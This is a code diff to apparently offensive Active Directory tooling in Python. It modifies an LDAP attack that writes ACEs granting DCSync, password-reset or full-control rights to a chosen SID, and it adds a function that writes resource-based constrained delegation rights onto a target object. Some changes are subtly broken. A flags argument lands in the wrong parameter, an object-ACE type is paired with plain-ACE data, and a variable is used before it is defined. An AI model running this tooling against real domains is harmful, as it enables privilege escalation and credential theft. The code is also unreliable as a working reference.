@@ -47,7 +47,7 @@ from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
-from powerview.utils.constants import WELL_KNOWN_SIDS, EXTENDED_RIGHTS_NAME_MAP
+from powerview.utils.constants import WELL_KNOWN_SIDS, EXTENDED_RIGHTS_NAME_MAP, EXTENDED_RIGHTS_MAP, SCHEMA_OBJECTS
 
 # This is new from ldap3 v2.5
 try:
@@ -354,7 +354,8 @@ class LDAPAttack(ProtocolAttack):
     def aclAttack(self):
         rights = {
                 'dcsync':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'], EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All']],
-                'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
+                #'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
+                'all':[SIMPLE_PERMISSIONS.FullControl.value],
                 'resetpassword':[EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password']],
                 'writemembers':[EXTENDED_RIGHTS_NAME_MAP['Self-Membership']]
             }
@@ -384,11 +385,19 @@ class LDAPAttack(ProtocolAttack):
         entry = self.client.entries[0]
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-        
+
         if not self.args.delete:
+            aceflags = 0x00
+            if hasattr(self.args, "inheritance") and self.args.inheritance:
+                LOG.debug('Inheritance is set. Adding CONTAINER_INHERIT_ACE, OBJECT_INFERIT_ACE')
+                aceflags = ACE.CONTAINER_INHERIT_ACE + ACE.OBJECT_INHERIT_ACE
+        
             if self.args.rights.lower() in list(rights.keys()):
-                for guid in rights[self.args.rights.lower()]:
-                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+                if self.args.rights.lower() == "all":
+                    secDesc['Dacl']['Data'].append(create_ace(SIMPLE_PERMISSIONS.FullControl.value, usersid, aceflags))
+                else:
+                    for guid in rights[self.args.rights.lower()]:
+                        secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid, aceflags))
             else:
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
@@ -948,15 +957,37 @@ class LDAPAttack(ProtocolAttack):
             domainDumper.domainDump()
             LOG.info('Domain info dumped into lootdir!')
 
-# Create an object ACE with the specified privguid and our sid
-def create_object_ace(privguid, sid):
+# Builds a standard ACE for a specified access mask (rights) and a specified SID (the principal who obtains the right)
+# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/72e7c7ea-bc02-4c74-a619-818a16bf6adb
+#   - access_mask : the allowed access mask
+#   - sid : the principal's SID
+#   - ace_type : the ACE type (allowed or denied)
+def create_ace(access_mask, sid, ace_type, aceflags=0x00):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x02 # inherit to child objects
+    nace['AceFlags'] = aceflags
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = access_mask
+    acedata['Sid'] = ldaptypes.LDAP_SID()
+    acedata['Sid'].fromCanonical(sid)
+    nace['Ace'] = acedata
+    logging.debug('ACE created.')
+    return nace
+
+# Create an object ACE with the specified privguid and our sid
+def create_object_ace(privguid, sid, aceflags=0x00):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+    nace['AceFlags'] = aceflags # inherit to child objects
     acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     #acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
-    acedata['Mask']['Mask'] = 983551 # Full control
+    if privguid == EXTENDED_RIGHTS_NAME_MAP['Self-Membership']:
+        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP + ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
+    else:
+        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+    #acedata['Mask']['Mask'] = 983551 # Full control
     acedata['ObjectType'] = string_to_bin(privguid)
     acedata['InheritedObjectType'] = b''
     acedata['Sid'] = ldaptypes.LDAP_SID()
@@ -967,13 +998,13 @@ def create_object_ace(privguid, sid):
     return nace
 
 # Create an ALLOW ACE with the specified sid
-def create_allow_ace(sid):
+def create_allow_ace(sid, aceflags=0x00):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x02
+    nace['AceFlags'] = aceflags
     acedata = ldaptypes.ACCESS_ALLOWED_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
-    acedata['Mask']['Mask'] = 983551 # Full control
+    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
     acedata['Sid'] = ldaptypes.LDAP_SID()
     acedata['Sid'].fromCanonical(sid)
     nace['Ace'] = acedata
@@ -1038,13 +1069,9 @@ class ADUser:
         """
         if not self.__client.tls_started and not self.__client.server.ssl:
             LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
-            try:
-                if not self.__client.start_tls():
-                    LOG.error('StartTLS failed')
-                    return False
-            except ldap3.core.exceptions.LDAPStartTLSError as e:
-                    LOG.error(str(e))
-                    return False
+            if not self.__client.start_tls():
+                LOG.error('StartTLS failed')
+                return False
 
         # Random password
         if not newPassword:
@@ -1144,34 +1171,62 @@ class ALLOWED_OBJECT_ACE_MASK_FLAGS(Enum):
     Self = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_SELF
 
 class ACLEnum:
-    def __init__(self, entries, ldap_session, root_dn, args=None):
+    def __init__(self, powerview, entries, root_dn, resolveguids=None, targetidentity=None, principalidentity=None, guids_map_dict=None):
         self.entries = entries
-        self.ldap_session = ldap_session
+        self.powerview = powerview
         self.root_dn = root_dn
         self.objectdn = ''
         self.objectsid = ''
-        self.__resolveguids = args.resolveguids
-        self.__targetidentity = args.identity
-        self.__principalidentity = args.security_identifier
-        self.__guids_map_dict = args.guids_map_dict
+
+        self.__resolveguids = resolveguids
+        self.__targetidentity = targetidentity
+        self.__principalidentity = principalidentity
+        
+        # Combine the GUID maps
+        self.__guids_map_dict = {}
+        # Add guids_map_dict if provided
+        if guids_map_dict:
+            self.__guids_map_dict.update(guids_map_dict)
+        
+        # Add EXTENDED_RIGHTS_MAP (key: guid, value: name)
+        self.__guids_map_dict.update(EXTENDED_RIGHTS_MAP)
+        self.__guids_map_dict.update(SCHEMA_OBJECTS)
+        
+        # Add reverse mapping from EXTENDED_RIGHTS_NAME_MAP (key: guid, value: name)
+        # This is already the reverse of EXTENDED_RIGHTS_MAP, so we don't need to add it
+        
+        # Create reverse mapping for lookups by name
+        self.__rights_name_map = {v: k for k, v in self.__guids_map_dict.items()}
 
     def read_dacl(self):
         parsed_dacl = []
-        LOG.debug("Parsing DACL")
+        LOG.debug("[ACLEnum] Parsing DACL")
         for entry in self.entries:
             dacl_dict = {}
-            if len(entry['ntSecurityDescriptor'].raw_values) == 0:
-                LOG.debug(f'ntSecurityDescriptor attribute not found for {entry.entry_dn}')
+            
+            secDescData = entry.get('attributes', {}).get('nTSecurityDescriptor')
+            if not secDescData:
+                LOG.debug(f'[ACLEnum] ntSecurityDescriptor attribute not found for {entry.get("dn")}')
                 continue
-            secDescData = entry['ntSecurityDescriptor'].raw_values[0]
-            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-
-            # TODO: Implement bloodhound dacl and ace parsing method, more reliable
-            self.objectdn = entry.entry_dn
-            self.objectsid = entry['objectSid'].value
-            dacl = self.parseDACL(secDesc['Dacl'])
-            dacl_dict['attributes'] = dacl
-            parsed_dacl.append(dacl_dict)
+            
+            if isinstance(secDescData, list):
+                secDescData = secDescData[0]
+            
+            objectsid = entry.get('attributes', {}).get('objectSid')
+            if isinstance(objectsid, list) and len(objectsid) > 0:
+                objectsid = objectsid[0]
+            
+            try:
+                secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
+                self.objectdn = entry.get('dn')
+                self.objectsid = objectsid
+                dacl = self.parseDACL(secDesc['Dacl'])
+                dacl_dict['attributes'] = dacl
+                parsed_dacl.append(dacl_dict)
+            except Exception as e:
+                LOG.debug(f'[ACLEnum] Error parsing security descriptor for {entry.get("dn")}: {str(e)}')
+                continue
+            
         return parsed_dacl
 
     def parseDACL(self, dacl):
@@ -1186,88 +1241,50 @@ class ACLEnum:
         if self.__principalidentity and self.__principalidentity != ace["Ace"]["Sid"].formatCanonical():
             return
 
-        if ace['TypeName'] in [ "ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_ACE", "ACCESS_DENIED_OBJECT_ACE" ]:
+        if ace['TypeName'] in ["ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_ACE", "ACCESS_DENIED_OBJECT_ACE"]:
             parsed_ace = {}
             parsed_ace['ObjectDN'] = self.objectdn
             parsed_ace['ObjectSID'] = format_sid(self.objectsid)
             parsed_ace['ACEType'] = ace['TypeName']
-            _ace_flags = []
-            for FLAG in ACE_FLAGS:
-                if ace.hasFlag(FLAG.value):
-                    _ace_flags.append(FLAG.name)
+            
+            # Parse ACE Flags
+            _ace_flags = [FLAG.name for FLAG in ACE_FLAGS if ace.hasFlag(FLAG.value)]
             parsed_ace['ACEFlags'] = ", ".join(_ace_flags) or "None"
-            if ace['TypeName'] in [ "ACCESS_ALLOWED_ACE", "ACCESS_DENIED_ACE" ]:
+            
+            if ace['TypeName'] in ["ACCESS_ALLOWED_ACE", "ACCESS_DENIED_ACE"]:
                 parsed_ace['ActiveDirectoryRights'] = ",".join(self.parsePerms(ace["Ace"]["Mask"]["Mask"]))
-                parsed_ace['AccessMask'] = "0x%x" % (ace['Ace']['Mask']['Mask'])
+                parsed_ace['AccessMask'] = ",".join(self.parsePerms(ace['Ace']['Mask']['Mask']))
                 parsed_ace['InheritanceType'] = "None"
-                parsed_ace['SecurityIdentifier'] = "%s (%s)" % (self.resolveSID(ace['Ace']['Sid'].formatCanonical()) or "UNKNOWN", ace['Ace']['Sid'].formatCanonical())
-            elif ace['TypeName'] in [ "ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_OBJECT_ACE" ]:
-                # Extracts the mask values. These values will indicate the ObjectType purpose
-                _access_mask_flags = []
-                for FLAG in ALLOWED_OBJECT_ACE_MASK_FLAGS:
-                    if ace['Ace']['Mask'].hasPriv(FLAG.value):
-                        _access_mask_flags.append(FLAG.name)
+                parsed_ace['SecurityIdentifier'] = self.powerview.convertfrom_sid(ace['Ace']['Sid'].formatCanonical())
+            
+            elif ace['TypeName'] in ["ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_OBJECT_ACE"]:
+                # Parse Access Mask Flags
+                _access_mask_flags = [FLAG.name for FLAG in ALLOWED_OBJECT_ACE_MASK_FLAGS if ace['Ace']['Mask'].hasPriv(FLAG.value)]
                 parsed_ace['AccessMask'] = ", ".join(_access_mask_flags)
-                # Extracts the ACE flag values and the trusted SID
-                _object_flags = []
-                for FLAG in OBJECT_ACE_FLAGS:
-                    if ace['Ace'].hasFlag(FLAG.value):
-                        _object_flags.append(FLAG.name)
-                parsed_ace['ObjectAceFlags'] = ", ".join(_object_flags) or "None"
-                # Extracts the ObjectType GUID values
+                
+                # Parse Object Flags
+                _object_flags = [FLAG.name for FLAG in OBJECT_ACE_FLAGS if ace['Ace'].hasFlag(FLAG.value)]
+                parsed_ace['ObjectAceFlags'] = ", ".join(_object_flags) or None
+                
+                # Parse ObjectType GUID
                 if ace['Ace']['ObjectTypeLen'] != 0:
                     obj_type = bin_to_string(ace['Ace']['ObjectType']).lower()
-                    if self.__resolveguids:
-                        try:
-                            parsed_ace['ObjectAceType'] = "%s (%s)" % (OBJECTTYPE_GUID_MAP[obj_type], obj_type)
-                        except KeyError:
-                            try:
-                                parsed_ace['ObjectAceType'] = "%s (%s)" % (self.__guids_map_dict[obj_type], obj_type)
-                            except KeyError:
-                                parsed_ace['ObjectAceType'] = "UNKNOWN (%s)" % obj_type
-                    else:
-                        parsed_ace['ObjectAceType'] = "%s" % obj_type
-                # Extracts the InheritedObjectType GUID values
+                    parsed_ace['ObjectAceType'] = self.__guids_map_dict.get(obj_type, "UNKNOWN (%s)" % obj_type)
+                
+                # Parse InheritedObjectType GUID
                 if ace['Ace']['InheritedObjectTypeLen'] != 0:
                     inh_obj_type = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
-                    if self.__resolveguids:
-                        try:
-                            parsed_ace['InheritanceType'] = "%s (%s)" % (OBJECTTYPE_GUID_MAP[inh_obj_type], inh_obj_type)
-                        except KeyError:
-                            parsed_ace['InheritanceType'] = "UNKNOWN (%s)" % inh_obj_type
-                    else:
-                        parsed_ace['InheritanceType'] = "%s" % inh_obj_type
+                    parsed_ace['InheritanceType'] = self.__guids_map_dict.get(inh_obj_type, "UNKNOWN (%s)" % inh_obj_type)
                 else:
-                    parsed_ace['InheritanceType'] = "None"
-                # Extract the Trustee SID (the object that has the right over the DACL bearer)
-                parsed_ace['SecurityIdentifier'] = "%s (%s)" % (self.resolveSID(ace['Ace']['Sid'].formatCanonical()) or "UNKNOWN", ace['Ace']['Sid'].formatCanonical())
+                    parsed_ace['InheritanceType'] = None
+                
+                # Parse Trustee SID
+                parsed_ace['SecurityIdentifier'] = self.powerview.convertfrom_sid(ace['Ace']['Sid'].formatCanonical())
         else:
-            # If the ACE is not an access allowed
             LOG.debug("ACE Type (%s) unsupported for parsing yet, feel free to contribute" % ace['TypeName'])
-            parsed_ace = {}
-            parsed_ace['ACEType'] = ace['TypeName']
-            _ace_flags = []
-            for FLAG in ACE_FLAGS:
-                if ace.hasFlag(FLAG.value):
-                    _ace_flags.append(FLAG.name)
-            parsed_ace['ACEFlags'] = ", ".join(_ace_flags) or "None"
-            parsed_ace['DEBUG'] = "ACE type not supported for parsing by dacleditor.py, feel free to contribute"
+            parsed_ace = {'ACEType': ace['TypeName'], 'ACEFlags': ", ".join(_ace_flags) or "None", 'DEBUG': "ACE type not supported for parsing by dacleditor.py, feel free to contribute"}
+        
         return parsed_ace
-
-    def resolveSID(self, sid):
-        # Tries to resolve the SID from the well known SIDs
-        if sid in WELL_KNOWN_SIDS.keys():
-            return WELL_KNOWN_SIDS[sid]
-        # Tries to resolve the SID from the LDAP domain dump
-        else:
-            self.ldap_session.search(self.root_dn, '(objectSid=%s)' % sid, attributes=['samaccountname'])
-            try:
-                dn = self.ldap_session.entries[0].entry_dn
-                samname = self.ldap_session.entries[0]['samaccountname']
-                return samname
-            except IndexError:
-                LOG.debug('SID not found in LDAP: %s' % sid)
-                return ""
 
     def parsePerms(self, fsr):
         _perms = []
@@ -1332,24 +1349,41 @@ class ObjectOwner:
         return ownersid
 
 class RBCD:
-    def __init__(self, entry):
+    def __init__(self, entry, ldap_session=None):
         try:
             self.__target_samaccountname = entry["attributes"]["sAMAccountName"][0] if isinstance(entry["attributes"]["sAMAccountName"], list) else entry["attributes"]["sAMAccountName"]
         except IndexError as e:
+            self.__target_samaccountname = None
             pass
+        try:
             self.__target_sid = entry["attributes"]["objectSid"][0] if isinstance(entry["attributes"]["objectSid"], list) else entry["attributes"]["objectSid"]
         except IndexError as e:
+            self.__target_sid = None
             pass
+        try:
             self.__target_dn = entry["attributes"]["distinguishedName"][0] if isinstance(entry["attributes"]["distinguishedName"], list) else entry["attributes"]["distinguishedName"]
         except IndexError as e:
+            self.__target_dn = None
             pass
         try:
             self.__target_msds_allowedtoactonbehalfofotheridentity = entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] if isinstance(entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"], list) else entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"]
         except IndexError as e:
+            self.__target_msds_allowedtoactonbehalfofotheridentity = None
             pass
-        self.__target_securitydescriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.__target_msds_allowedtoactonbehalfofotheridentity)
+        try:
+            self.__target_securitydescriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.__target_msds_allowedtoactonbehalfofotheridentity)
+        except:
+            self.__target_securitydescriptor = None
+            pass
+
+
+        self.ldap_session = ldap_session
 
     def read(self):
+        if self.__target_securitydescriptor is None:
+            logging.error("[RBCD] msDS-AllowedToActOnBehalfOfOtherIdentity not found in object")
+            return
+
         user_can_delegate = []
         sd = self.__target_securitydescriptor
         if len(sd['Dacl'].aces) > 0:
@@ -1357,3 +1391,25 @@ class RBCD:
                 user_can_delegate.append(ace['Ace']['Sid'].formatCanonical())
 
         return user_can_delegate
+
+    def write_to(self, objectsid):
+        logging.debug("[RBCD] Creating SDDL manually")
+        sd = create_empty_sd()
+        sd['Dacl'].aces.append(create_allow_ace(objectsid))
+        logging.debug(f"[RBCD] Appended {objectsid} to SDDL")
+        self.ldap_session.modify(
+            self.__target_dn,
+            {
+                'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]
+            }
+        )
+        if self.ldap_session.result['result'] == 0:
+            return True
+        else:
+            if self.ldap_session.result['result'] == 50:
+                logging.error('Could not modify object, the server reports insufficient rights: %s', self.ldap_session.result['message'])
+            elif self.ldap_session.result['result'] == 19:
+                logging.error('Could not modify object, the server reports a constrained violation: %s', self.ldap_session.result['message'])
+            else:
+                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
+            return False
